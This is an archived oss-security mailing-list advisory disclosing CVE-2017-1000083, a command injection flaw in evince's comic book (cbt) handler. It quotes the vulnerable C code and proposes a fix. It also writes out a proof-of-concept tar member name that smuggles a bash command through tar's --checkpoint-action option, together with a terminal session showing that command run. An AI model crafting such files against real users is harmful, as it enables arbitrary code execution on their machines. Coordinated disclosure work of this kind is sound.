X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4319" "Thursday" "13" "July" "2017" "17:43:44" "+0200" "Johannes Segitz" "jsegitz@suse.de" "<20170713154344.GG21662@suse.com>" "106" "[oss-security] CVE-2017-1000083: evince: Command injection vulnerability in CBT handler" "^Date:" nil nil "7" "2017071315:43:44" "[oss-security] CVE-2017-1000083: evince: Command injection vulnerability in CBT handler" (number mark "U       jsegitz@suse Jul 13  106/4319  " thread-indent "\"[oss-security] CVE-2017-1000083: evince: Command injection vulnerability in CBT handler\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 25720 invoked by uid 550); 13 Jul 2017 15:45:58 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 24120 invoked from network); 13 Jul 2017 15:43:57 -0000
X-Virus-Scanned: by amavisd-new at test-mx.suse.de
Message-ID: <20170713154344.GG21662@suse.com>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha512;
	protocol="application/pgp-signature"; boundary="lQSB8Tqijvu1+4Ba"
Content-Disposition: inline
User-Agent: Mutt/1.5.24 (2015-08-30)
Date: Thu, 13 Jul 2017 17:43:44 +0200
From: Johannes Segitz <jsegitz@suse.de>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE-2017-1000083: evince: Command injection vulnerability in CBT
 handler
To: oss-security@lists.openwall.com

--lQSB8Tqijvu1+4Ba
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hello,

we were asked to bring this to distros and per list policy it is now made
public on this list.

From: Felix Wilhelm
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
The comic book backend in evince 3.24.0 is vulnerable to a command
injection bug that can be used to execute arbitrary commands when a cbt
file is opened:

cbt files are simple tar archives containing images. When a cbt file is
processed, evince calls
"tar -xOf $archive $filename" for every image file in the archive:

// backend/comics/comics-document.c: 914
        command_line =3D g_strdup_printf ("%s %s %s",
                                        comics_document->extract_command,
                                        quoted_archive,
                                        quoted_filename);

While both the archive name and the filename are quoted to not be
interpreted by the shell,
the filename is completely attacker controlled an can start with "--"
which leads to tar interpreting it
as a command line flag.

This can be exploited by creating a tar archive with an embedded file
named something
like this: "--checkpoint-action=3Dexec=3Dbash -c 'touch ~/covfefe.evince;'.=
jpg"

(Make sure evince is not sandboxed by apparmor before trying to reproduce
the attached POC)

fwilhelm@box $ tar -tf poc.cbt
--checkpoint-action=3Dexec=3Dbash -c 'touch ~/covfefe.evince;'.jpg
fwilhelm@box $ ls -la ~/covfefe.evince
ls: cannot access covfefe.evince: No such file or directory
fwilhelm@box $ evince poc.cbt
fwilhelm@box $ ls -la ~/covfefe.evince
-rw-r----- 1 fwilhelm eng 0 Jun 28 11:05 /home/fwilhelm/covfefe.evince

An easy way to fix this would be to change the  ComicBookDecompressCommand
entry for tar to
{"%s -xOf --"          , "%s -tf -- %s"      , NULL             , FALSE,
NO_OFFSET}

Please credit Felix Wilhelm from the Google Security Team in all releases,
patches and advisories related to this issue.
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Additional information by Michael Catanzaro:
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
It looks like the affected code was deleted right after the Evince 3.24.0
release, so master is not vulnerable. But current releases are. I'll ask
around to see how we want to handle this.
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

and

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Since it looks like this can probably be used to take over a user account
with no user interaction beyond visiting a malicious webpage (via drive-by
web browser download -> nautilus thumbnailer) I guess we should probably do
a coordinated disclosure instead of just dropping new releases with no
warning.
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

This is tracked as CVE-2017-1000083, further information can be found at
https://bugzilla.gnome.org/show_bug.cgi?id=3D784630

Johannes
--=20
GPG Key E7C81FA0       EE16 6BCE AD56 E034 BFB3  3ADD 7BF7 29D5 E7C8 1FA0
Subkey fingerprint:    250F 43F5 F7CE 6F1E 9C59  4F95 BC27 DD9D 2CC4 FD66
SUSE Linux GmbH, GF: Felix Imend=F6rffer, Jane Smithard, Graham Norton
HRB 21284 (AG N=FCrnberg)

--lQSB8Tqijvu1+4Ba
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: Digital signature

-----BEGIN PGP SIGNATURE-----

iQIcBAEBCgAGBQJZZ5UwAAoJELwn3Z0sxP1mkY0P/3VhUK+SiAz2y7Xnk5dZHQLR
tz/5OgxpmxgbmFwwvPOsO7j8167ljtJKgXwX7X0e37z1fTsXVuxvJZ+67ZXZuY7l
rYUmISH1ADoe+ESb+CsrXAn63Xj60esyNOt3J2JxnxlNuwsOwYEYcEZbBHRsRml2
Ypt4Imc9cm1Kos1MJewRgsV+fiQ+cFTmfT+oqeBUG/ns1LMny3fIpJuCxlmjCKGp
ahUB9KTq0wtN5dlxPkjYqE7GI7iAN278Z8XGWYo13uuT6W8NkgjvvGl1QyXE+3yb
qaYrRnG1mTpXU4bA6Lq1x2Cv/EnUXHhNvPCdQfDMgm8WYl/AaqS2gjR1vwP8zA7Y
I6BWyMsjoKx1j1bgE4J1ZwKghTGd+8LKDS5gj8hDDJAD7SJsQj0tpnRjNvTX35PO
AAERKmyAWI9XCNNCa3eXlZoePCmbroZbT8r8Cd0AqDGLZMvEAUVw6AnDjQOuzHHp
QEjxJoVh/fRuI47y23UfnigfsVxf1tLP93xiAgpn3zwwJFPqTk/IuPB/gKeH9L7z
qRc9eHYm84bMQfPQIJVfoE6ljLjWAA6nJtM1B1sPvrpxLe0xlP9Xr6uUbWcwpF1B
1r1KcrqyYmhgGD3eVsvTJUcFCCejUALZ5uQuvVd8OFrsgemV4sCeK09vL2y7lP3R
GP3NXIDHaIkbqeRbuGIk
=TYkF
-----END PGP SIGNATURE-----

--lQSB8Tqijvu1+4Ba--
